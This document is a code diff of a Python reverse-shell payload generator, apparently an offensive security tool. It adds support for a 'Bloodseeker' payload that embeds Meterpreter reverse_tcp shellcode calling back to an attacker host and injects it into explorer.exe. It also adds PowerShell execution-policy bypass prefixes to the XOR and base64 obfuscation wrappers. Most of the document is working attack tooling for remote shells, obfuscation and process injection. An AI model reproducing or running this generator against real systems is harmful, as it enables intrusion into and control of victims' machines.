@@ -1,7 +1,10 @@
 from encoders import powershell_base64, xor, to_unicode, to_urlencode
 from binascii import hexlify
+from binary import shellcode_to_ps1, WINDOWS_BLOODSEEKER_SCRIPT # imported since 0.3.6
+from sys import exit
 import platform
 import os
+
 
 class OperationalSystem(object):
     def __init__(self):
@@ -33,7 +36,12 @@ def xor_wrapper(name, code, args, shell="/bin/bash"):
             code = """s="";for x in $(echo {0}|sed "s/../&\\n/g"); do s=$s$(echo -e $(awk "BEGIN {{printf \\"%x\\n\\", xor(0x$x, {1})}}"|sed "s/../\\\\\\\\x&/g"));done;echo $s|{2}""".format(hexlify(xor(code, args.xor)), hex(args.xor), shell)
             code = shell + " -c '" + code + "'"
     else:
-        prefix, xcode = code.split("-Command")
+        # Improved code in 0.3.6
+        if "-Command" in code:
+            prefix, xcode = code.split("-Command")
+        else:
+            prefix = "poweshell.exe -nop -ep bypass "
+            xcode = code
         pcode = xcode.replace("'", "")
         pcode = pcode.replace("\\", "")
         
@@ -53,7 +61,13 @@ def base64_wrapper(name, code, args,shell="/bin/bash"):
                 code = "echo " + code.encode("base64").replace("\n", "") + "|base64 -d|{0}".format(shell)
         else:
             # Powershell encoding code
-            prefix, xcode = code.split("-Command")
+            # Improved code in 0.3.6
+            if "-Command" in code:
+                prefix, xcode = code.split("-Command")
+            else:
+                prefix = "poweshell.exe -nop -ep bypass "
+                xcode = code
+            
             pcode = xcode.replace("'", "") # Remove single quotes from -Command
             pcode = pcode.replace("\\", "") # remove string quotation
             code = prefix + "-Encoded " + powershell_base64(pcode)
@@ -101,7 +115,29 @@ class ReverseShell(object):
         Generate the code.
         Apply encoding, in the correct order, of course.
         """
-        self.code = str(self.code.replace("TARGET", self.host)).replace("PORT", str(self.port))
+        # Update of 0.3.6
+        # Some custom shells will not need TARGET and PORT strings.
+        # To deal with that, I will just try to find them in the string first.
+        if "TARGET" in self.code and "PORT" in self.code:
+            self.code = str(self.code.replace("TARGET", self.host)).replace("PORT", str(self.port))
+        else:
+            # Custom shell. Here we need to program individually based in specifics.
+            if "bloodseeker" in self.name.lower(): # This is for Bloodseeker project.
+                
+                # This one requires a stager.
+                if self.args.stager is None:
+                    print(error("This payload REQUIRES --stager flag."))
+                    exit(1)
+                
+                print(info("Generating shellcode ..."))
+                malicious_script = str(WINDOWS_BLOODSEEKER_SCRIPT.decode("base64")).replace("SHELLCODEHERE", shellcode_to_ps1("windows/x64/meterpreter/reverse_tcp", self.args.host, self.args.port))
+                self.code = malicious_script.replace("PROCESSNAME", "explorer") # we want inject into explorer.exe
+                print(info("Make sure you have a handler for windows/x64/meterpreter/reverse_tcp listening."))
+
+            else:
+                print(error("No custom shell procedure was arranged for this shell. This is fatal."))
+                exit(1)
+
         
         # Apply xor encoding.
         self.code = self.code if self.args.xor is 0 else xor_wrapper(self.name, self.code, self.args)
